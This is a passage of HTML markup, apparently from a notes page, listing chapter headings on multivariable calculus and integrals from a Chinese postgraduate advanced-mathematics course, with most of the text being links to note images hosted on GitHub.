src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%85%AB%E7%AB%A0%20%E5%90%91%E9%87%8F%E4%BB%A3%E6%95%B0%E4%B8%8E%E7%A9%BA%E9%97%B4%E8%A7%A3%E6%9E%90%E5%87%A0%E4%BD%95/5.%E7%A9%BA%E9%97%B4%E6%9B%B2%E9%9D%A2%E5%8F%8A%E6%96%B9%E7%A8%8B/5%E7%A9%BA%E9%97%B4%E6%9B%B2%E9%9D%A2%E5%8F%8A%E6%96%B9%E7%A8%8B.jpg" alt="测试">    </p>  </li>  <li>    <p>空间曲线及方程</p>  </li></ol><p><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%85%AB%E7%AB%A0%20%E5%90%91%E9%87%8F%E4%BB%A3%E6%95%B0%E4%B8%8E%E7%A9%BA%E9%97%B4%E8%A7%A3%E6%9E%90%E5%87%A0%E4%BD%95/6.%E7%A9%BA%E9%97%B4%E6%9B%B2%E7%BA%BF%E5%8F%8A%E6%96%B9%E7%A8%8B/6%E7%A9%BA%E9%97%B4%E6%9B%B2%E7%BA%BF%E5%8F%8A%E6%96%B9%E7%A8%8B_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%85%AB%E7%AB%A0%20%E5%90%91%E9%87%8F%E4%BB%A3%E6%95%B0%E4%B8%8E%E7%A9%BA%E9%97%B4%E8%A7%A3%E6%9E%90%E5%87%A0%E4%BD%95/6.%E7%A9%BA%E9%97%B4%E6%9B%B2%E7%BA%BF%E5%8F%8A%E6%96%B9%E7%A8%8B/6%E7%A9%BA%E9%97%B4%E6%9B%B2%E7%BA%BF%E5%8F%8A%E6%96%B9%E7%A8%8B_2.jpg" alt="测试"></p><h3 id="第九章-多元函数微分学及应用"><a href="#第九章-多元函数微分学及应用" class="headerlink" title="第九章 多元函数微分学及应用"></a>第九章  多元函数微分学及应用</h3><ol>  <li>    <p>多元函数的基本概念<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8/1.%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/1%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8/1.%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/1%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8/1.%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/1%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5_3.jpg" alt="测试">    </p>  </li>  <li>    <p>偏导数<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8/2.%E5%81%8F%E5%AF%BC%E6%95%B0/2%E5%81%8F%E5%AF%BC%E6%95%B0_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8/2.%E5%81%8F%E5%AF%BC%E6%95%B0/2%E5%81%8F%E5%AF%BC%E6%95%B0_2.jpg" alt="测试">    </p>  </li>  <li>    <p>全微分<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8/3.%E5%85%A8%E5%BE%AE%E5%88%86/3%E5%85%A8%E5%BE%AE%E5%88%86_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8/3.%E5%85%A8%E5%BE%AE%E5%88%86/3%E5%85%A8%E5%BE%AE%E5%88%86_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8/3.%E5%85%A8%E5%BE%AE%E5%88%86/3%E5%85%A8%E5%BE%AE%E5%88%86_3.jpg" alt="测试">    </p>  </li>  <li>    <p>多元复合函数求导法则<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8/4.%E5%A4%9A%E5%85%83%E5%A4%8D%E5%90%88%E5%87%BD%E6%95%B0%E6%B1%82%E5%AF%BC%E6%B3%95%E5%88%99/4%E5%A4%9A%E5%85%83%E5%A4%8D%E5%90%88%E5%87%BD%E6%95%B0%E6%B1%82%E5%AF%BC%E6%B3%95%E5%88%99_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8/4.%E5%A4%9A%E5%85%83%E5%A4%8D%E5%90%88%E5%87%BD%E6%95%B0%E6%B1%82%E5%AF%BC%E6%B3%95%E5%88%99/4%E5%A4%9A%E5%85%83%E5%A4%8D%E5%90%88%E5%87%BD%E6%95%B0%E6%B1%82%E5%AF%BC%E6%B3%95%E5%88%99_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8/4.%E5%A4%9A%E5%85%83%E5%A4%8D%E5%90%88%E5%87%BD%E6%95%B0%E6%B1%82%E5%AF%BC%E6%B3%95%E5%88%99/4%E5%A4%9A%E5%85%83%E5%A4%8D%E5%90%88%E5%87%BD%E6%95%B0%E6%B1%82%E5%AF%BC%E6%B3%95%E5%88%99_3.jpg" alt="测试">    </p>  </li>  <li>    <p>隐函数求导法则<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8/5.%E9%9A%90%E5%87%BD%E6%95%B0%E6%B1%82%E5%AF%BC%E6%B3%95%E5%88%99/5%E9%9A%90%E5%87%BD%E6%95%B0%E6%B1%82%E5%AF%BC.jpg" alt="测试">    </p>  </li>  <li>    <p>多元函数微分学的几何应用<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8/6.%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E7%9A%84%E5%87%A0%E4%BD%95%E5%BA%94%E7%94%A8/6%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E7%9A%84%E5%87%A0%E4%BD%95%E5%BA%94%E7%94%A8_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8/6.%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E7%9A%84%E5%87%A0%E4%BD%95%E5%BA%94%E7%94%A8/6%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E7%9A%84%E5%87%A0%E4%BD%95%E5%BA%94%E7%94%A8_2.jpg" alt="测试">    </p>  </li>  <li>    <p>方向导数与梯度<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8/7.%E6%96%B9%E5%90%91%E5%AF%BC%E6%95%B0%E4%B8%8E%E6%A2%AF%E5%BA%A6/7%E6%96%B9%E5%90%91%E5%AF%BC%E6%95%B0%E4%B8%8E%E6%A2%AF%E5%BA%A6_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8/7.%E6%96%B9%E5%90%91%E5%AF%BC%E6%95%B0%E4%B8%8E%E6%A2%AF%E5%BA%A6/7%E6%96%B9%E5%90%91%E5%AF%BC%E6%95%B0%E4%B8%8E%E6%A2%AF%E5%BA%A6_2.jpg" alt="测试">    </p>  </li>  <li>    <p>代数应用——多元函数的极值<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8/8.%E4%BB%A3%E6%95%B0%E5%BA%94%E7%94%A8%E2%80%94%E2%80%94%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E7%9A%84%E6%9E%81%E5%80%BC/8%E4%BB%A3%E6%95%B0%E5%BA%94%E7%94%A8%E2%80%94%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E7%9A%84%E6%9E%81%E5%80%BC_1.jpg" alt="测试">    </p>  </li></ol><p><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8/8.%E4%BB%A3%E6%95%B0%E5%BA%94%E7%94%A8%E2%80%94%E2%80%94%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E7%9A%84%E6%9E%81%E5%80%BC/8%E4%BB%A3%E6%95%B0%E5%BA%94%E7%94%A8%E2%80%94%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E7%9A%84%E6%9E%81%E5%80%BC_2.jpg" alt="测试"></p><h3 id="第十章-重积分"><a href="#第十章-重积分" class="headerlink" title="第十章 重积分"></a>第十章  重积分</h3><ol>  <li>    <p>二重积分的概念和性质<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E9%87%8D%E7%A7%AF%E5%88%86/1.%E4%BA%8C%E9%87%8D%E7%A7%AF%E5%88%86%E7%9A%84%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8/1%E4%BA%8C%E9%87%8D%E7%A7%AF%E5%88%86%E7%9A%84%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E9%87%8D%E7%A7%AF%E5%88%86/1.%E4%BA%8C%E9%87%8D%E7%A7%AF%E5%88%86%E7%9A%84%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8/1%E4%BA%8C%E9%87%8D%E7%A7%AF%E5%88%86%E7%9A%84%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8_2.jpg" alt="测试">    </p>  </li>  <li>    <p>二重积分的计算法<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E9%87%8D%E7%A7%AF%E5%88%86/2.%E4%BA%8C%E9%87%8D%E7%A7%AF%E5%88%86%E7%9A%84%E8%AE%A1%E7%AE%97%E6%B3%95/2%E4%BA%8C%E9%87%8D%E7%A7%AF%E5%88%86%E7%9A%84%E8%AE%A1%E7%AE%97%E6%B3%95_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E9%87%8D%E7%A7%AF%E5%88%86/2.%E4%BA%8C%E9%87%8D%E7%A7%AF%E5%88%86%E7%9A%84%E8%AE%A1%E7%AE%97%E6%B3%95/2%E4%BA%8C%E9%87%8D%E7%A7%AF%E5%88%86%E7%9A%84%E8%AE%A1%E7%AE%97%E6%B3%95_2.jpg" alt="测试">    </p>  </li>  <li>    <p>三重积分<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E9%87%8D%E7%A7%AF%E5%88%86/3.%E4%B8%89%E9%87%8D%E7%A7%AF%E5%88%86/3%E4%B8%89%E9%87%8D%E7%A7%AF%E5%88%86_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E9%87%8D%E7%A7%AF%E5%88%86/3.%E4%B8%89%E9%87%8D%E7%A7%AF%E5%88%86/3%E4%B8%89%E9%87%8D%E7%A7%AF%E5%88%86_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E9%87%8D%E7%A7%AF%E5%88%86/3.%E4%B8%89%E9%87%8D%E7%A7%AF%E5%88%86/3%E4%B8%89%E9%87%8D%E7%A7%AF%E5%88%86_3.jpg" alt="测试">    </p>  </li>  <li>    <p>重积分的应用<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E9%87%8D%E7%A7%AF%E5%88%86/4.%E9%87%8D%E7%A7%AF%E5%88%86%E7%9A%84%E5%BA%94%E7%94%A8/4%E9%87%8D%E7%A7%AF%E5%88%86%E5%BA%94%E7%94%A8_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E9%87%8D%E7%A7%AF%E5%88%86/4.%E9%87%8D%E7%A7%AF%E5%88%86%E7%9A%84%E5%BA%94%E7%94%A8/4%E9%87%8D%E7%A7%AF%E5%88%86%E5%BA%94%E7%94%A8_2.jpg" alt="测试">    </p>  </li></ol><h3 id="第十一章-曲线积分与曲面积分"><a href="#第十一章-曲线积分与曲面积分" class="headerlink" title="第十一章 曲线积分与曲面积分"></a>第十一章  曲线积分与曲面积分</h3><ol>  <li>    <p>对弧长的曲线积分<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0%20%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86%E4%B8%8E%E6%9B%B2%E9%9D%A2%E7%A7%AF%E5%88%86/1.%E5%AF%B9%E5%BC%A7%E9%95%BF%E7%9A%84%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86/1%E5%AF%B9%E5%BC%A7%E9%95%BF%E7%9A%84%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0%20%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86%E4%B8%8E%E6%9B%B2%E9%9D%A2%E7%A7%AF%E5%88%86/1.%E5%AF%B9%E5%BC%A7%E9%95%BF%E7%9A%84%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86/1%E5%AF%B9%E5%BC%A7%E9%95%BF%E7%9A%84%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86_2.jpg" alt="测试">    </p>  </li>  <li>    <p>对坐标的曲线积分</p>  </li></ol><p><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0%20%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86%E4%B8%8E%E6%9B%B2%E9%9D%A2%E7%A7%AF%E5%88%86/2.%E5%AF%B9%E5%9D%90%E6%A0%87%E7%9A%84%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86/2%E5%AF%B9%E5%9D%90%E6%A0%87%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0%20%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86%E4%B8%8E%E6%9B%B2%E9%9D%A2%E7%A7%AF%E5%88%86/2.%E5%AF%B9%E5%9D%90%E6%A0%87%E7%9A%84%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86/2%E5%AF%B9%E5%9D%90%E6%A0%87%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86_2.jpg" alt="测试"></p><ol start="3">  <li>    <p>格林公式及应用<br><img 